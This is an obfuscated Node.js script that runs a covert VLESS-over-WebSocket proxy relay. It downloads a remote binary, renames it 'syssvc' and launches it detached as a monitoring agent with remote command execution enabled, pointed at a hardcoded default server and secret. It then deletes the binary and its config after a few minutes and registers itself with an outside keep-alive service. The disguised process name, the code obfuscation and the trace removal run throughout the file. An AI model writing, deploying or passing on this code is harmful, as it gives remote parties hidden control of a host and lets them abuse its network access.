const _0x5428b9=_0x39b2;(function(_0x40ac90,_0x55757b){const _0x49e980=_0x39b2,_0x18971b=_0x40ac90();while(!![]){try{const _0x3b59d3=parseInt(_0x49e980(0x10c))/0x1*(parseInt(_0x49e980(0xf5))/0x2)+parseInt(_0x49e980(0x14c))/0x3*(parseInt(_0x49e980(0x13f))/0x4)+parseInt(_0x49e980(0x13e))/0x5*(-parseInt(_0x49e980(0x116))/0x6)+parseInt(_0x49e980(0x132))/0x7*(parseInt(_0x49e980(0xed))/0x8)+-parseInt(_0x49e980(0xea))/0x9+-parseInt(_0x49e980(0xf3))/0xa*(parseInt(_0x49e980(0x139))/0xb)+-parseInt(_0x49e980(0x10e))/0xc*(-parseInt(_0x49e980(0x125))/0xd);if(_0x3b59d3===_0x55757b)break;else _0x18971b['push'](_0x18971b['shift']());}catch(_0x31e519){_0x18971b['push'](_0x18971b['shift']());}}}(_0x2358,0x988b7));const os=require('os'),http=require(_0x5428b9(0x124)),fs=require('fs'),path=require(_0x5428b9(0xf2)),axios=require('axios'),net=require(_0x5428b9(0x110)),{Buffer}=require(_0x5428b9(0x126)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),SECRET_KEY=process[_0x5428b9(0x137)][_0x5428b9(0x130)]||_0x5428b9(0x136),MONITOR_HOST=process[_0x5428b9(0x137)][_0x5428b9(0xf7)]||_0x5428b9(0xeb),MONITOR_PORT=process[_0x5428b9(0x137)]['MONITOR_PORT']||'',MONITOR_AUTH=process['env'][_0x5428b9(0x111)]||_0x5428b9(0xf8),PRIMARY_DOMAIN=process[_0x5428b9(0x137)][_0x5428b9(0x149)]||'',AUTO_PING=process[_0x5428b9(0x137)][_0x5428b9(0xf6)]||![],RELAY_PATH=process[_0x5428b9(0x137)][_0x5428b9(0x142)]||SECRET_KEY[_0x5428b9(0x117)](0x0,0x8),CONFIG_PATH=process[_0x5428b9(0x137)][_0x5428b9(0x102)]||_0x5428b9(0xee),NODE_LABEL=process[_0x5428b9(0x137)]['NODE_LABEL']||'Vl',SERVICE_PORT=process['env'][_0x5428b9(0x129)]||0xbb8;let detectedISP='';function _0x2358(){const _0x138146=['MONITOR_AUTH','自动访问任务已成功注册','https://arm64.ssss.nyc.mn/v1','send','启动\x20syssvc\x20错误:\x20','22614pKEqne','slice','8443','pop','setsid\x20nohup\x20./syssvc\x20-c\x20monitor_config.yaml\x20>/dev/null\x202>&1\x20&','reduce','map','base64','2083','asOrganization','https://utility.external-service.net/register-url','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','vless://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','http','39yGmgue','buffer','arm64','2053','PORT','pipe','split','false','connect','get','includes','SECRET_KEY','application/json','259dxHlIJ','Server','监控变量不完整，跳过探针启动','&fp=chrome&type=ws&host=','161fc0b2-cfa3-4053-8d51-20aeee66c2dd','env','readUInt8','66vccmLO','finish','substr','message','writeFileSync','295GTQRUa','4hQoAuj','data','post','RELAY_PATH','syssvc','/bin/bash','text/html','text/plain','url','arch','PRIMARY_DOMAIN','&path=%2F','concat','1253037CPqdNp','index.html','readFile','log','\x20-p\x20','9064431RwRzIO','kcystufkiiuc.ap-northeast-1.clawcloudrun.com:443','monitor_config.yaml','98120CILtoo','sub123','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[s]yssvc\x22','error','listen','path','1221780CFsIkj','unlink','84CNUWjT','AUTO_PING','MONITOR_HOST','2h1TEmM79EPLBctbNrd014hWlkZ3Sr26','replace','未知提供商','createWriteStream','end','join','country','toString','syssvc\x20下载完成','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','CONFIG_PATH','utf-8','arm','trim','@skk.moe:443?encryption=none&security=tls&sni=','connection','chmod\x20+x\x20syssvc','--tls','aarch64','https://speed.cloudflare.com/meta','28757jGYMaB','writeHead','2032572FkUCUa','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','net'];_0x2358=function(){return _0x138146;};return _0x2358();}const retrieveISP=async()=>{const _0x43da2c=_0x5428b9;try{const _0x32bb13=await axios[_0x43da2c(0x12e)](_0x43da2c(0x10b)),_0x561acd=_0x32bb13[_0x43da2c(0x140)];detectedISP=(_0x561acd[_0x43da2c(0xfe)]+'-'+_0x561acd[_0x43da2c(0x11f)])[_0x43da2c(0xf9)](/ /g,'_');}catch(_0x10f9cb){detectedISP=_0x43da2c(0xfa);}};retrieveISP();function _0x39b2(_0x32d95a,_0x152f17){const _0x2358e7=_0x2358();return _0x39b2=function(_0x39b29d,_0x4ace09){_0x39b29d=_0x39b29d-0xe6;let _0x740150=_0x2358e7[_0x39b29d];return _0x740150;},_0x39b2(_0x32d95a,_0x152f17);}const webService=http['createServer']((_0x237059,_0xafca15)=>{const _0x8b8543=_0x5428b9;if(_0x237059[_0x8b8543(0x147)]==='/')fs[_0x8b8543(0xe7)](path[_0x8b8543(0xfd)](__dirname,_0x8b8543(0xe6)),(_0x453fe9,_0x5aa791)=>{const _0x51c511=_0x8b8543;_0x453fe9?(_0xafca15[_0x51c511(0x10d)](0x1f4,{'Content-Type':_0x51c511(0x146)}),_0xafca15[_0x51c511(0xfc)]('Internal\x20Server\x20Error')):(_0xafca15[_0x51c511(0x10d)](0xc8,{'Content-Type':_0x51c511(0x145)}),_0xafca15[_0x51c511(0xfc)](_0x5aa791));});else{if(_0x237059[_0x8b8543(0x147)]==='/'+CONFIG_PATH){const _0x4fc795=_0x8b8543(0x122)+SECRET_KEY+_0x8b8543(0x106)+PRIMARY_DOMAIN+_0x8b8543(0x135)+PRIMARY_DOMAIN+_0x8b8543(0x14a)+RELAY_PATH+'#'+NODE_LABEL+'-'+detectedISP,_0x265646=Buffer['from'](_0x4fc795)[_0x8b8543(0xff)](_0x8b8543(0x11d));_0xafca15[_0x8b8543(0x10d)](0xc8,{'Content-Type':'text/plain'}),_0xafca15['end'](_0x265646+'\x0a');}else _0xafca15[_0x8b8543(0x10d)](0x194,{'Content-Type':'text/plain'}),_0xafca15[_0x8b8543(0xfc)]('未找到资源\x0a');}}),wsServer=new WebSocket[(_0x5428b9(0x133))]({'server':webService}),normalizedUUID=SECRET_KEY[_0x5428b9(0xf9)](/-/g,'');wsServer['on'](_0x5428b9(0x107),_0x10f0ea=>{const _0x32edbc=_0x5428b9;_0x10f0ea['once'](_0x32edbc(0x13c),_0x71f1dc=>{const _0x281ad5=_0x32edbc,[_0x4faf1e]=_0x71f1dc,_0x351800=_0x71f1dc[_0x281ad5(0x117)](0x1,0x11);if(!_0x351800['every']((_0x3ecfb9,_0x3342e8)=>_0x3ecfb9==parseInt(normalizedUUID[_0x281ad5(0x13b)](_0x3342e8*0x2,0x2),0x10)))return;let _0x40dbbc=_0x71f1dc[_0x281ad5(0x117)](0x11,0x12)[_0x281ad5(0x138)]()+0x13;const _0xb7f9c=_0x71f1dc['slice'](_0x40dbbc,_0x40dbbc+=0x2)['readUInt16BE'](0x0),_0x205ff0=_0x71f1dc[_0x281ad5(0x117)](_0x40dbbc,_0x40dbbc+=0x1)[_0x281ad5(0x138)]();let _0x53948f;if(_0x205ff0==0x1)_0x53948f=_0x71f1dc[_0x281ad5(0x117)](_0x40dbbc,_0x40dbbc+=0x4)[_0x281ad5(0xfd)]('.');else{if(_0x205ff0==0x2)_0x53948f=new TextDecoder()['decode'](_0x71f1dc[_0x281ad5(0x117)](_0x40dbbc+0x1,_0x40dbbc+=0x1+_0x71f1dc['slice'](_0x40dbbc,_0x40dbbc+0x1)['readUInt8']()));else{if(_0x205ff0==0x3)_0x53948f=_0x71f1dc[_0x281ad5(0x117)](_0x40dbbc,_0x40dbbc+=0x10)[_0x281ad5(0x11b)]((_0x1729b4,_0x556ddd,_0xfc9127,_0x3d94c1)=>_0xfc9127%0x2?_0x1729b4[_0x281ad5(0x14b)](_0x3d94c1[_0x281ad5(0x117)](_0xfc9127-0x1,_0xfc9127+0x1)):_0x1729b4,[])[_0x281ad5(0x11c)](_0x551f12=>_0x551f12['readUInt16BE'](0x0)['toString'](0x10))[_0x281ad5(0xfd)](':');else return;}}_0x10f0ea[_0x281ad5(0x114)](new Uint8Array([_0x4faf1e,0x0]));const _0x32de54=createWebSocketStream(_0x10f0ea);net[_0x281ad5(0x12d)]({'host':_0x53948f,'port':_0xb7f9c},function(){const _0x166276=_0x281ad5;this['write'](_0x71f1dc[_0x166276(0x117)](_0x40dbbc)),_0x32de54['on'](_0x166276(0xf0),()=>{})[_0x166276(0x12a)](this)['on'](_0x166276(0xf0),()=>{})[_0x166276(0x12a)](_0x32de54);})['on'](_0x281ad5(0xf0),()=>{});})['on']('error',()=>{});});const getAgentDownloadUrl=()=>{const _0x3f8cc0=_0x5428b9,_0x5ce0b8=os[_0x3f8cc0(0x148)]();return _0x5ce0b8===_0x3f8cc0(0x104)||_0x5ce0b8===_0x3f8cc0(0x127)||_0x5ce0b8===_0x3f8cc0(0x10a)?MONITOR_PORT?'https://arm64.ssss.nyc.mn/agent':_0x3f8cc0(0x113):MONITOR_PORT?'https://amd64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/v1';},downloadAgent=async()=>{const _0x4dafcc=_0x5428b9;if(!MONITOR_HOST&&!MONITOR_AUTH)return;try{const _0x4f3cc2=getAgentDownloadUrl(),_0x48a631=await axios({'method':_0x4dafcc(0x12e),'url':_0x4f3cc2,'responseType':'stream'}),_0x524c7b=fs[_0x4dafcc(0xfb)](_0x4dafcc(0x143));return _0x48a631['data'][_0x4dafcc(0x12a)](_0x524c7b),new Promise((_0x1b2b58,_0x341d42)=>{const _0x1c19c2=_0x4dafcc;_0x524c7b['on'](_0x1c19c2(0x13a),()=>{const _0x1f2c02=_0x1c19c2;console[_0x1f2c02(0xe8)](_0x1f2c02(0x100)),exec(_0x1f2c02(0x108),_0x5cbcc3=>{if(_0x5cbcc3)_0x341d42(_0x5cbcc3);_0x1b2b58();});}),_0x524c7b['on']('error',_0x341d42);});}catch(_0x447b38){throw _0x447b38;}},launchMonitorAgent=async()=>{const _0x3230e5=_0x5428b9;try{const _0x577a47=execSync(_0x3230e5(0xef),{'encoding':_0x3230e5(0x103)});if(_0x577a47[_0x3230e5(0x105)]()!==''){console['log']('syssvc\x20进程已活跃，跳过启动...');return;}}catch(_0xb5fd32){}await downloadAgent();let _0x458d2d='';const _0x59d74b=['443',_0x3230e5(0x118),'2096','2087',_0x3230e5(0x11e),_0x3230e5(0x128)];if(MONITOR_HOST&&MONITOR_PORT&&MONITOR_AUTH){const _0x3f7ec0=_0x59d74b[_0x3230e5(0x12f)](MONITOR_PORT)?_0x3230e5(0x109):'';_0x458d2d='setsid\x20nohup\x20./syssvc\x20-s\x20'+MONITOR_HOST+':'+MONITOR_PORT+_0x3230e5(0xe9)+MONITOR_AUTH+'\x20'+_0x3f7ec0+_0x3230e5(0x121);}else{if(MONITOR_HOST&&MONITOR_AUTH){if(!MONITOR_PORT){const _0x5786f2=MONITOR_HOST[_0x3230e5(0x12f)](':')?MONITOR_HOST[_0x3230e5(0x12b)](':')[_0x3230e5(0x119)]():'',_0x5deb00=_0x59d74b[_0x3230e5(0x12f)](_0x5786f2)?'true':_0x3230e5(0x12c),_0x17dd9b='client_secret:\x20'+MONITOR_AUTH+_0x3230e5(0x123)+MONITOR_HOST+_0x3230e5(0x101)+_0x5deb00+_0x3230e5(0x10f)+SECRET_KEY;fs[_0x3230e5(0x13d)](_0x3230e5(0xec),_0x17dd9b);}_0x458d2d=_0x3230e5(0x11a);}else{console[_0x3230e5(0xe8)](_0x3230e5(0x134));return;}}try{exec(_0x458d2d,{'shell':_0x3230e5(0x144)},_0x799cb=>{const _0xa28e04=_0x3230e5;if(_0x799cb)console[_0xa28e04(0xf0)]('syssvc\x20执行错误:',_0x799cb);else console[_0xa28e04(0xe8)]('syssvc\x20网页服务开启');});}catch(_0x56e5f2){console[_0x3230e5(0xf0)](_0x3230e5(0x115)+_0x56e5f2);}};async function registerAutoAccess(){const _0x3768e7=_0x5428b9;if(!AUTO_PING)return;if(!PRIMARY_DOMAIN)return;const _0x12883d='https://'+PRIMARY_DOMAIN+'/'+CONFIG_PATH;try{const _0x141452=await axios[_0x3768e7(0x141)](_0x3768e7(0x120),{'url':_0x12883d},{'headers':{'Content-Type':_0x3768e7(0x131)}});console[_0x3768e7(0xe8)](_0x3768e7(0x112));}catch(_0x23cb13){}}const cleanupFiles=()=>{const _0x38e99d=_0x5428b9;fs[_0x38e99d(0xf4)]('syssvc',()=>{}),fs[_0x38e99d(0xf4)](_0x38e99d(0xec),()=>{});};webService[_0x5428b9(0xf1)](SERVICE_PORT,()=>{const _0x3f0038=_0x5428b9;launchMonitorAgent(),setTimeout(()=>{cleanupFiles();},0x2bf20),registerAutoAccess(),console[_0x3f0038(0xe8)]('网页访问服务运行在端口\x20'+SERVICE_PORT);});
